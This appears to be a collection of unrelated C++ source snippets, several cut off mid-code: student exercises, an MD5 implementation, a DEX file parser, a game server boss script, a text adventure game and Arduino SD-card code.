    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   ClapTrap.cpp                                       :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: jpaul <jpaul@student.42kl.edu.my>          +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2025/01/28 14:48:59 by jpaul             #+#    #+#             */\n/*   Updated: 2025/01/28 15:28:59 by jpaul            ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"ClapTrap.hpp\"\n\nClapTrap::ClapTrap(const std::string& new_name) : name(new_name), hitPoint(10), energyPoint(10), attackDamage(0)\n{\n    std::cout << \"ClapTrap \" << name << \" constructed!\\n\";\n}\n\nClapTrap::~ClapTrap()\n{\n    std::cout << \"ClapTrap \" << name  << \" destructed!\\n\";\n}\n\nvoid ClapTrap::attack(const std::string& target)\n{\n    if (hitPoint == 0 || energyPoint == 0) \n    {\n        std::cout  << name  << \" cannot attack. No hit / energy points left!\\n\";\n        return;\n    }\n    energyPoint--;\n    std::cout << name << \" attacks \" << target  << \", causing \" << attackDamage << \" damage points\\n\"; \n}\n\nvoid ClapTrap::takeDamage(unsigned int amount)\n{\n    if (hitPoint <= amount) \n    {\n        hitPoint = 0;\n        std::cout << name  << \" took \" << amount << \" damage and died\\n\";\n    } \n    else \n    {\n        hitPoint -= amount;\n        std::cout << name  << \" took \" << amount << \" damage and has \" << hitPoint << \" hit points left!\\n\";\n    }\n}\n\nvoid ClapTrap::beRepaired(unsigned int amount)\n{\n    if (hitPoint == 0 || energyPoint == 0)\n    {\n        std::cout << name << \" cannot repair. No hit / energy points left!\\n\";\n        return;\n    }\n    energyPoint--;\n    hitPoint += amount;\n    std::cout << name << \" repaired itself, gaining \" << amount << \" hit points!\\n\";\n}\n",
    "#include \"university.cpp\"\n\nclass university_main\n{\npublic:\n    StudentRecords student_records;\n    hash_table hash;\n    bst courses_bst;\n    university_main()\n        : student_records(), hash(), courses_bst()\n    {\n    }\n\n    // single linked list\n    void add_student()\n    {\n        cout << \"Enter student id: \\n\";\n        int id = int_checker();\n        Student *student = linear_search_student(student_records.head, id);\n        if (student == NULL)\n        {\n            string name;\n            string email;\n\n            cout << \"Enter student name: \\n\";\n            getline(cin, name);\n\n            cout << \"Enter student email: \\n\";\n            cin >> email;\n\n            student_records.add(id, name, email);\n            cout << \"Added Student with id \" << id << endl;\n        }\n        else\n        {\n            cout << \"already exists\" << endl;\n        }\n    }\n    void delete_student()\n    {\n        cout << \"Enter student id: \\n\";\n        int id = int_checker();\n        Student *student = linear_search_student(student_records.head, id);\n        if (student == NULL)\n        {\n            cout << \"Not found.\\n\";\n        }\n        else\n        {\n            bool check_in_queue = check_student_in_queue(courses_bst.root, student);\n            if (student->enrollmentHistory->head != NULL)\n            {\n                cout << \"This Student Cannot be deleted because he is enrolled in courses. \" << endl;\n            }\n            else if (check_in_queue)\n            {\n                cout << \"This Student Cannot be deleted because he is in waitlits of a course. \" << endl;\n            }\n            else\n            {\n                student_records.remove(id);\n                cout << \"Deleted Student: \" << id << endl;\n            }\n        }\n    }\n\n    void display_student_details()\n    {\n        cout << \"Enter student id: \\n\";\n        int id = int_checker();\n        student_records.display_details(id);\n    }\n    void display_students()\n    {\n        student_records.display();\n    }\n\n    // bst\n    bool courseexist(int id)\n    {\n        return binary_search_course(courses_bst.root, id) != nullptr;\n    }\n    void addcourse()\n    {\n        cout << \"Enter id course:\" << endl;\n        int idcourse = int_checker();\n        if (courseexist(idcourse))\n        {\n            cout << \" Course with this id is already exist \\n\";\n            return;\n        }\n        else\n        {\n            string teachers, namecourse;\n            cout << \"Enter course enrollment limit: \\n\";\n            int limit;\n            while (true)\n            {\n                string input;\n\n                getline(cin, input);\n                try\n                {\n                    limit = stoi(input);\n                    if (limit < 1)\n                    {\n                        cout << \"Invalid input! Please enter a valid number (number > 0): \";\n                        continue;\n                    }\n                    break;\n                }\n                catch (...)\n                {\n                    cout << \"Invalid input! Please enter a valid number: \";\n                }\n            }\n            cout << \"Enter number of credits: \\n\";\n            int credithours = int_checker();\n\n            cout << \"Enter course name: \\n\";\n            getline(cin, namecourse);\n\n            cout << \"Enter instructor name: \\n\";\n            getline(cin, teachers);\n\n            cout << \"How many prerequisites does this course have? \";\n            int size;\n            cin >> size;\n\n            Course *course = courses_bst.addcourse(idcourse, namecourse, credithours, teachers, limit, size);\n            courses_bst.balance_bst();\n            hash.insert_hash(course);\n        }\n    }\n    void displaycourses()\n    {\n        cout << \"display all courses: \\n\";\n        courses_bst.display(courses_bst.root);\n    }\n    void Removecourse()\n    {\n        cout << \"Enter id course:\" << endl;\n        int idcourse = int_checker();\n        if (courseexist(idcourse) == false)\n        {\n            cout << \"This course does not exist.\\n\";\n            return;\n        }\n        else\n        {\n            if (check_any_student_enrolled(student_records.head, idcourse))\n            {\n                cout << \"You cannot delete this course while there is someone enrolled to it! \" << endl;\n                return;\n            }\n            courses_bst.deleteCourse(idcourse);\n            hash.remove_from_hash(idcourse);\n\n            cout << \"Course removed.\\n\";\n        }\n    }\n\n    void viewpre()\n    {\n        cout << \"Enter course id to see the prequist: \" << endl;\n        int course_id = int_checker();\n        cout << \"Enter Student id:\" << endl;\n        int student_id = int_checker();\n\n        Course *course = binary_search_course(courses_bst.root, course_id);\n        Student *student = linear_search_student(student_records.head, student_id);\n\n        if (course && student)\n        {\n            Display_remaining_Prerequisites(course, student);\n        }\n        else\n        ",
    "#include \"hash_algorithms.h\"\n\n\nvoid HashAlgorithms::_get_MD5_K() {\n    for (int i = 0; i < HASH_LEN; i++ ) {\n        MD5_K[i] = -1;\n    }\n}\nstring HashAlgorithms::_dec2hex(unsigned int _temp, int _len) {\n    \n    stringstream ioss; string s_temp;\n    ioss << hex << _temp;\n    ioss >> s_temp;\n    if (s_temp.length() < _len) {\n        string _zero(\"0\", _len - s_temp.length());\n        s_temp = _zero + s_temp;\n    }\n    return s_temp;\n}\n\nstring HashAlgorithms::_hex2dec(string _temp) {\n\n    string _res = \"\";\n    for (int i = 0; i < _temp.length(); i++) {\n        _res += to_string((int)_temp.at(i));\n    }\n    return _res;\n}\n\n\nvoid HashAlgorithms::MD5_init() {\n\n    int _MD5_S[HASH_LEN] = {7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,\n        5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,\n        4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,\n        6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21}; \n\n    for (int i = 0; i < HASH_LEN; i++) {\n        MD5_S[i] = _MD5_S[i];\n    }\n    MD5_K[0] = 0xd76aa478; MD5_K[1] = 0xe8c7b756; MD5_K[2] = 0x242070db; MD5_K[3] = 0xc1bdceee;\n    MD5_K[4] = 0xf57c0faf; MD5_K[5] = 0x4787c62a; MD5_K[6] = 0xa8304613; MD5_K[7] = 0xfd469501;\n    MD5_K[8] = 0x698098d8; MD5_K[9] = 0x8b44f7af; MD5_K[10] = 0xffff5bb1; MD5_K[11] = 0x895cd7be;\n    MD5_K[12] = 0x6b901122; MD5_K[13] = 0xfd987193; MD5_K[14] = 0xa679438e; MD5_K[15] = 0x49b40821;\n    MD5_K[16] = 0xf61e2562; MD5_K[17] = 0xc040b340; MD5_K[18] = 0x265e5a51; MD5_K[19] = 0xe9b6c7aa;\n    MD5_K[20] = 0xd62f105d; MD5_K[21] = 0x02441453; MD5_K[22] = 0xd8a1e681; MD5_K[23] = 0xe7d3fbc8;\n    MD5_K[24] = 0x21e1cde6; MD5_K[25] = 0xc33707d6; MD5_K[26] = 0xf4d50d87; MD5_K[27] = 0x455a14ed;\n    MD5_K[28] = 0xa9e3e905; MD5_K[29] = 0xfcefa3f8; MD5_K[30] = 0x676f02d9; MD5_K[31] = 0x8d2a4c8a;\n    MD5_K[32] = 0xfffa3942; MD5_K[33] = 0x8771f681; MD5_K[34] = 0x6d9d6122; MD5_K[35] = 0xfde5380c;\n    MD5_K[36] = 0xa4beea44; MD5_K[37] = 0x4bdecfa9; MD5_K[38] = 0xf6bb4b60; MD5_K[39] = 0xbebfbc70;\n    MD5_K[40] = 0x289b7ec6; MD5_K[41] = 0xeaa127fa; MD5_K[42] = 0xd4ef3085; MD5_K[43] = 0x04881d05;\n    MD5_K[44] = 0xd9d4d039; MD5_K[45] = 0xe6db99e5; MD5_K[46] = 0x1fa27cf8; MD5_K[47] = 0xc4ac5665;\n    MD5_K[48] = 0xf4292244; MD5_K[49] = 0x432aff97; MD5_K[50] = 0xab9423a7; MD5_K[51] = 0xfc93a039;\n    MD5_K[52] = 0x655b59c3; MD5_K[53] = 0x8f0ccc92; MD5_K[54] = 0xffeff47d; MD5_K[55] = 0x85845dd1;\n    MD5_K[56] = 0x6fa87e4f; MD5_K[57] = 0xfe2ce6e0; MD5_K[58] = 0xa3014314; MD5_K[59] = 0x4e0811a1;\n    MD5_K[60] = 0xf7537e82; MD5_K[61] = 0xbd3af235; MD5_K[62] = 0x2ad7d2bb; MD5_K[63] = 0xeb86d391;\n\n    MD5_a0 = 0x67452301; MD5_b0 = 0xefcdab89; MD5_c0 = 0x98badcfe; MD5_d0 = 0x10325476; \n    //cout << \"MD5_a0: \" << MD5_a0 << endl; \n    //cout << \"MD5_b0: \" << MD5_b0 << endl; \n    //cout << \"MD5_c0: \" << MD5_c0 << endl; \n    //cout << \"MD5_d0: \" << MD5_d0 << endl; \n}\n\nint * HashAlgorithms::_add_char1( string message) {\n    int num = ((message.length() + 8) / 64) + 1, i;\n    int * strByte = new int[num * 16];\n    for (i = 0; i < num * 16; i++)\n        strByte[i] = 0;\n    for (i = 0; i < message.length(); i++) {\n        strByte[i >> 2] |= message.at(i) << ((i % 4) * 8);\n    }\n    strByte[i >> 2] |= 0x80 << ((i % 4) * 8);\n    strByte[num * 16 - 1] = message.length() * 8;\n    return strByte;\n}\n\nint * HashAlgorithms::_add_char2( string message) {\n    int num = ((message.length() + 8) / 64) + 1, i;\n    int * strByte = new int[num * 16];\n    for (i = 0; i < num * 16; i++)\n        strByte[i] = 0;\n    for (i = 0; i < message.length(); i++) {\n        strByte[i >> 2] |= message.at(i) << ((i % 4) * 8);\n    }\n    strByte[i >> 2] |= 0x80 << ((i % 4) * 8);\n    strByte[num * 16 - 2] = message.length() * 8;\n    return strByte;\n\n}\n\nint HashAlgorithms::_left_shift(int a, int s) {\n    if (s > 32) s %= 32;\n    unsigned int a_ = a;\n    return (int) (a_ << s ) | (a_ >> (32 - s) );\n}\n\nvoid HashAlgorithms::_little_endian(int *data, int len) {\n    for (int i = 0; i < len; i++) {\n        *data = ((*data & 0xff000000) >> 24) \n              | ((*data & 0x00ff0000) >> 8)\n              | ((*data & 0x0000ff00) << 8)\n              | ((*data & 0x000000ff) << 24);\n        data ++ ;\n    }\n}\n\nvoid HashAlgorithms::_big_endian(int *data, int len) {\n    for (int i = 0; i < len; i++) {\n        *data = __builtin_bswap32(*data);\n        data ++;\n    }\n}\n\nstring HashAlgorithms::MD5_value(string message) {\n    cout << \"me len : \" << message.length() << endl;\n    cout << \"message : \" << message << endl;\n    int len, fill_bit, fill_byte, new_len;\n    len = message.length() ; \n    fill_bit = 448 - (len * 8 % 512 ) % 448 ;\n    fill_byte = fill_bit / 8;\n    new_len = (len + fill_byte + 8) / 4;\n\n    int * new_message = _add_char2(  message);\n    int chunk_len = new_len * 32 / 512;\n    for (int i = 0; i < chunk_len; i++) {\n        int MD5_A = MD5_a0; int MD5_B = MD5_b0;\n        int MD5_C = MD5_c0; int MD5_D = MD5_d0;\n        for (int j = 0; j < 64; j ++) {\n            int MD5_F, MD5_",
    "#include <iostream>\n#include \"DexFile.h\"\n#include <cstdlib>\n\nint main(int argc, char* argv[]) {\n    std::vector<std::string> args(argv + 1, argv + argc);\n    std::string filePath;\n    //std::string filePath=R\"(E:\\KnowledgeRepository\\Android\\DexFileStructure\\NetEase_classes2.dex)\";\n    //DexFile dexfile(filePath);\n    //\u6d4b\u8bd5\n    //dexfile.printDexHeader();\n    //dexfile.printStringIds();\n    //dexfile.printTypeIds();\n    //dexfile.printProtoIds();\n    //dexfile.printFieldIds();\n    //dexfile.printMethodIds();\n    //dexfile.printMapList();\n    //dexfile.printClassDefs();\n    // \u5bfb\u627e\u6587\u4ef6\u8def\u5f84\n    for(int i=0;i<args.size();i++) {\n        if(args[i].find(\"-file\") != std::string::npos) {\n            filePath=args[++i];\n        }\n    }\n    if(filePath.empty()) {\n        std::cout<<\"File path is empty!\\n\"<<std::endl;\n        exit(0);\n    }\n    DexFile dexfile(filePath);\n    // \u89e3\u6790\u53c2\u6570,\u6267\u884c\u5bf9\u5e94\u64cd\u4f5c\n    for (const auto& arg : args) {\n        if(arg==\"-file\") {\n            std::cout<<\"File Path: \"<<filePath<<std::endl;\n        }\n        else if (arg == \"-header\") {\n            dexfile.printDexHeader();\n        } else if (arg == \"-strings\") {\n            dexfile.printStringIds();\n        } else if (arg == \"-types\") {\n            dexfile.printTypeIds();\n        } else if (arg == \"-protos\") {\n            dexfile.printProtoIds();\n        } else if (arg == \"-fields\") {\n            dexfile.printFieldIds();\n        } else if (arg == \"-methods\") {\n            dexfile.printMethodIds();\n        } else if (arg == \"-maplist\") {\n            dexfile.printMapList();\n        } else if (arg == \"-classdefs\") {\n            dexfile.printClassDefs();\n        } else {\n            std::cout << \"Unknown arg:\" << arg << std::endl;\n        }\n    }\n    return 0;\n}\n",
    "#include \"Firework.h\"\r\n#include \"Program.h\"\r\n\r\nFirework::Firework(Vector3 startPos, Vector3 startForce, Color color, bool first, float mass, Program* program)\r\n\t: pos(startPos), color(color), first(first), mass(mass)\r\n{\r\n\tthis->ApplyForce(startForce);\r\n\tthis->program = program;\r\n\tthis->destroy = false;\r\n\tthis->trail = new std::vector<Firework*>();\r\n}\r\n\r\nFirework::~Firework()\r\n{\r\n\tif(this->trail!= nullptr) delete this->trail;\r\n}\r\n\r\nvoid Firework::Init()\r\n{ \r\n}\r\n\r\nvoid Firework::Update()\r\n{\r\n\t//Move\r\n\tthis->pos += this->speed;\r\n\r\n\t//\"Gravity\"\r\n\tthis->speed -= Vector3{0, 1, 0};\r\n\tif (this->speed.y < 10)\r\n\t{\r\n\t\tthis->Explode();\r\n\t}\r\n\r\n\tif (!this->first)\r\n\t{\r\n\t\tthis->mass *= 0.95;\r\n\t\tif (this->mass < 0.1f)this->destroy = true;\r\n\t}\r\n\r\n\t//trail\r\n\tthis->trail->push_back(new Firework(this->pos, {0,0,0}, this->color, false, this->mass * 0.8, this->program));\r\n\tint _i = 0;\r\n\twhile (this->trail->size() > this->trailSize)\r\n\t{\r\n\t\tdelete this->trail->at(_i++);\r\n\t\tthis->trail->erase(this->trail->begin());\r\n\t}\r\n\r\n\tfor (int i = 0; i < this->trail->size(); i++)\r\n\t{\r\n\t\tauto t = this->trail->at(i);\r\n\t\tt->mass *= 0.5f;\r\n\t\tif (t->mass < 0.1f)\r\n\t\t{\r\n\t\t\tdelete t;\r\n\t\t\tthis->trail->erase(this->trail->begin() + i);\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid Firework::Draw()\r\n{\r\n\tDrawing::DrawCircle(this->pos, this->mass, this->color);\r\n\tfor(int i=0;i<this->trail->size();i++)\r\n\t{\r\n\t\tauto t = this->trail->at(i);\r\n\t\tauto t_prev = i > 0 ? this->trail->at(i - 1) : nullptr;\r\n\t\tif (t_prev != nullptr)\r\n\t\t{\r\n\t\t\tDrawing::DrawLine(t_prev->pos, t->pos, this->mass * 2, this->color);\r\n\t\t}\r\n\t\tt->Draw();\r\n\t}\r\n}\r\n\r\nvoid Firework::ApplyForce(Vector3 force)\r\n{\r\n\tthis->speed += (force / (mass)) * 0.5;\r\n\tthis->speed.x = floorf(this->speed.x);\r\n\tthis->speed.y = floorf(this->speed.y);\r\n\tthis->speed.z = floorf(this->speed.z);\r\n}\r\n\r\nvoid Firework::Explode()\r\n{\r\n\tif (!this->first)return;\r\n\tint n = Utils::Random(50, 80);\r\n\tfor (int i = 0; i < n; i++)\r\n\t{\r\n\t\tfloat force1 = Utils::Random(-100, 100) + this->speed.x * this->mass / 10;\r\n\t\tfloat force2 = Utils::Random(0, 170) + this->speed.y * this->mass / 10;\r\n\t\tfloat force3 = Utils::Random(-20, 20) + this->speed.z * this->mass / 10;\r\n\r\n\t\tVector3 force = Vector3{ force1, force2, force3 };\r\n\t\tthis->program->AddFirework(new Firework(this->pos, force, this->color, false, this->mass, this->program));\r\n\t}\r\n\tthis->destroy = true;\r\n}\r\n",
    "/*\n * This file is part of the TrinityCore Project. See AUTHORS file for Copyright information\n *\n * This program is free software; you can redistribute it and/or modify it\n * under the terms of the GNU General Public License as published by the\n * Free Software Foundation; either version 2 of the License, or (at your\n * option) any later version.\n *\n * This program is distributed in the hope that it will be useful, but WITHOUT\n * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\n * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for\n * more details.\n *\n * You should have received a copy of the GNU General Public License along\n * with this program. If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include \"AreaTriggerAI.h\"\n#include \"CreatureAI.h\"\n#include \"CreatureAIImpl.h\"\n#include \"GridNotifiers.h\"\n#include \"InstanceScript.h\"\n#include \"Map.h\"\n#include \"ObjectAccessor.h\"\n#include \"ScriptMgr.h\"\n#include \"ScriptedCreature.h\"\n#include \"SpellAuras.h\"\n#include \"SpellScript.h\"\n#include \"SpellAuraEffects.h\"\n#include \"antorus_the_burning_throne.h\"\n\nenum Texts\n{\n    // Garothi Worldbreaker\n    SAY_AGGRO                       = 0,\n    SAY_DISENGAGE                   = 1,\n    SAY_ANNOUNCE_APOCALYPSE_DRIVE   = 2,\n    SAY_APOCALYPSE_DRIVE            = 3,\n    SAY_ANNOUNCE_ERADICATION        = 4,\n    SAY_FINISH_APOCALYPSE_DRIVE     = 5,\n    SAY_DECIMATION                  = 6,\n    SAY_ANNIHILATION                = 7,\n    SAY_ANNOUNCE_FEL_BOMBARDMENT    = 8,\n    SAY_SLAY                        = 9,\n    SAY_DEATH                       = 10,\n\n    // Decimator\n    SAY_ANNOUNCE_DECIMATION         = 0\n};\n\nenum Spells\n{\n    // Garothi Worldbreaker\n    SPELL_MELEE                                 = 248229,\n    SPELL_APOCALYPSE_DRIVE                      = 244152,\n    SPELL_APOCALYPSE_DRIVE_PERIODIC_DAMAGE      = 253300,\n    SPELL_APOCALYPSE_DRIVE_FINAL_DAMAGE         = 240277,\n    SPELL_ERADICATION                           = 244969,\n    SPELL_EMPOWERED                             = 245237,\n    SPELL_RESTORE_HEALTH                        = 246012,\n    SPELL_ANNIHILATOR_CANNON_EJECT              = 245527,\n    SPELL_DECIMATOR_CANNON_EJECT                = 245515,\n    SPELL_FEL_BOMBARDMENT_SELECTOR              = 244150,\n    SPELL_FEL_BOMBARDMENT_WARNING               = 246220,\n    SPELL_FEL_BOMBARDMENT_DUMMY                 = 245219,\n    SPELL_FEL_BOMBARDMENT_PERIODIC              = 244536,\n    SPELL_CANNON_CHOOSER                        = 245124,\n    SPELL_SEARING_BARRAGE_ANNIHILATOR           = 246368,\n    SPELL_SEARING_BARRAGE_DECIMATOR             = 244395,\n    SPELL_SEARING_BARRAGE_DUMMY_ANNIHILATOR     = 244398,\n    SPELL_SEARING_BARRAGE_DUMMY_DECIMATOR       = 246369,\n    SPELL_SEARING_BARRAGE_SELECTOR              = 246360,\n    SPELL_SEARING_BARRAGE_DAMAGE_ANNIHILATOR    = 244400,\n    SPELL_SEARING_BARRAGE_DAMAGE_DECIMATOR      = 246373,\n    SPELL_CARNAGE                               = 244106,\n\n    // Decimator\n    SPELL_DECIMATION_SELECTOR                   = 244399,\n    SPELL_DECIMATION_WARNING                    = 244410,\n    SPELL_DECIMATION_CAST_VISUAL                = 245338,\n    SPELL_DECIMATION_MISSILE                    = 244448,\n\n    // Annihilator\n    SPELL_ANNIHILATION_SUMMON                   = 244790,\n    SPELL_ANNIHILATION_SELECTOR                 = 247572,\n    SPELL_ANNIHILATION_DUMMY                    = 244294,\n    SPELL_ANNIHILATION_DAMAGE_UNSPLITTED        = 244762,\n\n    // Annihilation\n    SPELL_ANNIHILATION_AREA_TRIGGER             = 244795,\n    SPELL_ANNIHILATION_WARNING                  = 244799,\n\n    // Garothi Worldbreaker (Surging Fel)\n    SPELL_SURGING_FEL_AREA_TRIGGER              = 246655,\n    SPELL_SURGING_FEL_DAMAGE                    = 246663\n\n};\n\nenum Events\n{\n    // Garothi Worldbreaker\n    EVENT_REENGAGE_PLAYERS = 1,\n    EVENT_FEL_BOMBARDMENT,\n    EVENT_SEARING_BARRAGE,\n    EVENT_CANNON_CHOOSER,\n    EVENT_SURGING_FEL\n};\n\nenum Data\n{\n    DATA_LAST_FIRED_CANNON = 0\n};\n\nenum AnimKits\n{\n    ANIM_KIT_ID_CANNON_DESTROYED = 13264\n};\n\nconstexpr uint8 MIN_TARGETS_SIZE = 2;\nconstexpr uint8 MAX_TARGETS_SIZE = 6;\n\nenum Misc\n{\n    SUMMON_GROUP_ID_SURGING_FEL         = 0,\n    ENCOUNTER_ID_GAROTHI_WORLDBREAKER   = 2076\n};\n\nnamespace TargetHandler\n{\n    class VictimCheck\n    {\n        public:\n            VictimCheck(Unit* caster, bool keepTank) : _caster(caster), _keepTank(keepTank) { }\n\n            bool operator()(WorldObject* object)\n            {\n                Unit* unit = object->ToUnit();\n                if (!unit)\n                    return true;\n\n                if (_caster->GetVictim() && _caster->GetVictim() != unit)\n                    return _keepTank;\n\n                return false;\n            }\n        private:\n            Unit* _caster;\n            bool _keepTank; // true = remove all nontank targets | false = remove current tank\n    };\n\n    void PreferNonTankTargetsAndResizeTargets(std::list<WorldObject*>& targets, Unit* caster)\n    {\n        if ",
    "#include <iostream>\r\n#include <thread>\r\n#include <atomic>\r\n#include <chrono>\r\n\r\n//---------------------------------------------------------------------------------------------------------\r\n\r\nclass HSClass {\r\npublic:\r\n    int currentHeartCount = 3;\r\n    int medkit = 0;\r\n    int bandages = 0;\r\n\r\n    void takeDamage(){\r\n        currentHeartCount -= 1;\r\n    }\r\n    \r\n    void healBandage(){\r\n        if (bandages > 0) {\r\n            currentHeartCount += 1;\r\n            bandages -= 1;\r\n        } else {\r\n            std::cout << \"No bandages left to use!\" << std::endl;\r\n        }\r\n    }\r\n    \r\n    void healMedkit(){\r\n        if (medkit > 0) {\r\n            currentHeartCount += 2;\r\n            medkit -= 1;\r\n        } else {\r\n            std::cout << \"No medkits left to use!\" << std::endl;\r\n        }\r\n    }\r\n\r\n};\r\n\r\n//-----------------------------------------------------------------------------------------------------\r\n\r\nclass AntiCheat {\r\npublic:\r\n    bool cheats = false;\r\n    std::atomic<bool> stopChecking; // Atomic flag to control the continuous checking.\r\n\r\n    // Constructor to initialize the cheats flag and checking control\r\n    AntiCheat(bool cheatsEnabled = false) : cheats(cheatsEnabled), stopChecking(false) {}\r\n\r\n    void start(HSClass& heartSystem) {\r\n        std::thread([this, &heartSystem]() {\r\n            while (!stopChecking) {\r\n                check(heartSystem);\r\n                std::this_thread::sleep_for(std::chrono::milliseconds(1000));\r\n            }\r\n        }).detach(); // Detach the thread so it runs independently\r\n    }\r\n\r\n    // Function to perform a single check on the heart system\r\n    void check(HSClass& heartSystem) {\r\n        if (cheats == false && heartSystem.currentHeartCount > 3) { // Fixed assignment issue\r\n            std::cout << \"AntiCheat: Heart count exceeds the allowed limit (3) with cheats disabled. Resetting to 1.\" << std::endl;\r\n            heartSystem.currentHeartCount = 1;\r\n        }\r\n        if (cheats == false && heartSystem.currentHeartCount < 1){\r\n            std::cout << \"No hearts left, exiting game\" << std::endl;\r\n            exit(0);\r\n        }\r\n        if (cheats == false && heartSystem.bandages > 10){\r\n            std::cout << \"AntiCheat: Bandages exceed the allowed limit (10) with cheats disabled. Resetting to 1 heart(s) and 10 bandage(s).\" << std::endl;\r\n            heartSystem.currentHeartCount = 1;\r\n            heartSystem.bandages = 10;\r\n        }\r\n        if (cheats == false && heartSystem.medkit > 5){\r\n            std::cout << \"AntiCheat: Medkits exceed the allowed limit (5) with cheats disabled. Resetting to 1 heart(s) and 5 medkit(s)\" << std::endl;\r\n            heartSystem.currentHeartCount = 1;\r\n            heartSystem.medkit = 5;\r\n        }\r\n    \r\n        }\r\n\r\n    void stop() {\r\n        stopChecking = true; // Properly stop the checking thread\r\n    }\r\n};\r\n\r\n\r\n\r\n\r\n\r\n//---------------------------------------------------------------------------------\r\n\r\n\r\n\r\n\r\n\r\nclass verification {\r\npublic:\r\n\r\n    long long int password;\r\n\r\n    void check (){\r\n\r\n        std::cout << \"Input a correct password: \";\r\n        std::cin >> password;\r\n        switch (password){\r\n            case 1234:\r\n                std::cout << \"Correct!\" << std::endl;\r\n                break;\r\n            default:\r\n                std::cout << \"Incorrect. Exiting\" << std::endl;\r\n                exit (0);\r\n        }\r\n\r\n    }\r\n\r\n};\r\n\r\n\r\n\r\n\r\n\r\n//-----------------------------------------------------------------------------------\r\n\r\nclass startUp {\r\npublic:\r\n    void boot(HSClass& heartSystem) {\r\n        std::cout << \"Starting\";\r\n        AntiCheat ac;\r\n        ac.start(heartSystem);\r\n        ac.check(heartSystem);\r\n        for (int i = 0; i < 2; i++) {\r\n            std::this_thread::sleep_for(std::chrono::milliseconds(333));\r\n            std::cout << \".\";\r\n        }\r\n        std::this_thread::sleep_for(std::chrono::milliseconds(333));\r\n        std::cout << \".\" << std::endl;\r\n\r\n    }\r\n\r\n};\r\n\r\n\r\n//---------------------------------------------------------------------------------------------------------\r\n\r\nclass engine{\r\npublic:\r\n    \r\n    HSClass hsc;\r\n\r\n    void engn(){\r\n\r\n        std::cout << \"Welcome!\" << std::endl;\r\n        std::this_thread::sleep_for(std::chrono::milliseconds(1000));\r\n\r\n        std::cout << \"Spawned in! Found: 1 Bandage, 1 Medkit!\" << \"\\n\";\r\n        hsc.medkit += 1;\r\n        hsc.bandages += 1;\r\n\r\n        std::cout << \"*TV Is ON and it's in the news channel*\" << \"\\n\";\r\n        std::cout << \"News Reporter: A new disease has spread widely across the globe that makes humans into Zombies.\\n\";\r\n        std::cout << \"*TV closes without you doing anything and the door is getting banged by a Zombie.*\\n\";\r\n        std::cout << \"The Zombie gets in your room.\\n\";\r\n        std::cout << \"What are you going to do? 1) Fight. 2) Try to run away\\n\";\r\n\r\n        int zombieDecision;\r\n        std::cin >> zombieDecision;\r\n\r\n        if (zombieDecision == 1) {\r\n            hsc.takeDamage();\r\n            ",
    "#include <iostream>\n#include <conio.h>\nusing namespace std;\nmain()\n{\n    int a,b,c,d,e,f,g,h;\n    int h1,h2,h3,h4;\n    //Kalkulator matematika dasar\n    cout<<\"=========== Kalkulator Aritmatika Dasar ============\";\n    cout<<\"\\n\";\n\n    //ini penjumlahan\n    cout<<\"Operasi Penjumlahan\\n\";\n    cout<<\"\\tMasukkan angka pertama \\t= \";cin>>a;\n    cout<<\"\\tMasukkan angka kedua \\t= \";cin>>b;\n    h1=a+b;\n    cout<<\"\\tHasil penjumlahan dari \"<<a<<\" ditambah dengan \"<<b<<\" adalah \"<<h1;\n\n    //ini pengurangan\n    cout<<\"\\n\";\n    cout<<\"#. Operasi Pengurangan\\n\";\n    cout<<\"\\tMasukkan angka pertama \\t= \";cin>>c;\n    cout<<\"\\tMasukkan angka kedua \\t= \";cin>>d;\n    h2=c-d;\n    cout<<\"\\tHasil pengurangan dari \"<<c<<\" ditambah dengan \"<<d<<\" adalah \"<<h2;\n\n    //ini pengalian\n    cout<<\"\\n\";\n    cout<<\"#. Operasi perkalian\\n\";\n    cout<<\"\\tMasukkan angka pertama \\t= \";cin>>e;\n    cout<<\"\\tMasukkan angka kedua \\t= \";cin>>f;\n    h3=e*f;\n    cout<<\"\\tHasil penjumlahan dari \"<<e<<\" ditambah dengan \"<<f<<\" adalah \"<<h3;\n\n    //ini pembagian\n    cout<<\"\\n\";\n    cout<<\"#. Operasi Pembagian\\n\";\n    cout<<\"\\tMasukkan angka pertama \\t= \";cin>>g;\n    cout<<\"\\tMasukkan angka kedua \\t= \";cin>>h;\n    h4=g/h;\n    cout<<\"\\tHasil pembagian dari \"<<g<<\" ditambah dengan \"<<h<<\" adalah \"<<h4;\n\n    cout<<\"\\n\\n\";\n    cout<<\"Selesai...\";\ngetch();\n}\n",
    "#include <Arduino.h>\n#include <SD.h>\n\n\n/**\n * Initialize the SD card (Trans Flash) using VSPI (SPI3_HOST) or HSPI_HOST (SPI2_HOST)\n * The pins SCK = 18, MISO = 19, MOSI = 23 and CS = 5 are wired onboard of the CYD\n * Define \n * SPIClass sdcardSPI(HSPI);\n * or\n * SPIClass sdcardSPI(VSPI);\n * in main.cpp \n * and pass sdcardSPI as argument to initSDcard()\n * In order to be able to use the touchpad in addition to the display and the SD card, \n * a software SPI must be implemented for this.\n*/\nvoid initSDCard(SPIClass &spi)\n{\n  // Use custom SPI class\n  spi.begin(TF_SCLK, TF_MISO, TF_MOSI, TF_CS);\n  if (!SD.begin(TF_CS, spi)) // \ud83d\udc49 Use default frequency of 4MHz\n      log_e(\"==> SD.begin failed!\");\n  else\n      log_e(\"==> done\");\n\n/*     // Use default VSPI with pins 5, 18, 19, 23 (CS, SCLK, MISO, MOSI)\n    if (!SD.begin()) // \ud83d\udc49 Use default frequency of 4MHz\n        log_e(\"==> SD.begin failed!\");\n    else\n        log_e(\"==> done\"); */\n}\n\n\n/**\n * Use a raw string literal to print a formatted string of SD card details\n*/\nvoid printSDCardInfo()\n{\n  const char *knownCardTypes[] = {\"NONE\", \"MMC\", \"SDSC\", \"SDHC\", 